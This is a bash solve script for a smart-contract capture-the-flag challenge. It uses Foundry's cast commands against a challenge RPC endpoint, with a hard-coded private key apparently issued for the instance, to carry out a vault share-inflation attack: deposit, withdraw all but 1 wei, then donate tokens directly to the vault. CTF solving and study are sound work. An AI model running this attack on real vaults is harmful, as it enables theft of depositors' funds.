#!/bin/bash

RPC_URL="http://ctf.compfest.id:7401/74118039-09bd-41a9-b048-d890a86d4cd2"
PRIVKEY="86be0897a2949cb9e80c0954e4aeaa9f28aab41af35f1d19ceb5a9c6ea697fbc"
SETUP_ADDR="0x4B89Cb1264F8A3304ac21cc2d687EF1683941C55"
WALLET_ADDR="0xB6eaF47cB5F68aec68D48F6ca9779E4E46a43131"

# Get Fortress address
FORTRESS_ADDR=$(cast call -r $RPC_URL $SETUP_ADDR "challenge()(address)")

# Get token address
TOKEN_ADDR=$(cast call -r $RPC_URL $FORTRESS_ADDR "token()(address)")

# Get vault address
VAULT_ADDR=$(cast call -r $RPC_URL $FORTRESS_ADDR "vault()(address)")

echo "Fortress: $FORTRESS_ADDR"
echo "Token: $TOKEN_ADDR"
echo "Vault: $VAULT_ADDR"

# Check wallet balance
BALANCE=$(cast balance -r $RPC_URL $WALLET_ADDR)
echo "Wallet balance: $BALANCE"

# Calculate amount to use (1 ether)
AMOUNT=1000000000000000000

# Step 1: Buy tokens
cast send -r $RPC_URL --private-key $PRIVKEY $TOKEN_ADDR "buyTokens()" --value $AMOUNT

# Step 2: Approve vault to spend tokens
cast send -r $RPC_URL --private-key $PRIVKEY $TOKEN_ADDR "approve(address,uint256)" $VAULT_ADDR $AMOUNT

# Step 3: Deposit tokens into vault
cast send -r $RPC_URL --private-key $PRIVKEY $VAULT_ADDR "deposit(uint256)" $AMOUNT

# Step 4: Withdraw almost all shares (amount - 1 wei)
WITHDRAW_AMOUNT=$(echo "$AMOUNT - 1" | bc)
cast send -r $RPC_URL --private-key $PRIVKEY $VAULT_ADDR "withdraw(uint256)" $WITHDRAW_AMOUNT

# Step 5: Transfer tokens directly to vault
cast send -r $RPC_URL --private-key $PRIVKEY $TOKEN_ADDR "transfer(address,uint256)" $VAULT_ADDR $WITHDRAW_AMOUNT

# Step 6: Check if solved
result=$(cast call -r $RPC_URL $SETUP_ADDR "isSolved()(bool)")
if [ "$result" = "true" ]; then
    echo "Solved!"
else
    echo "Not solved."
fi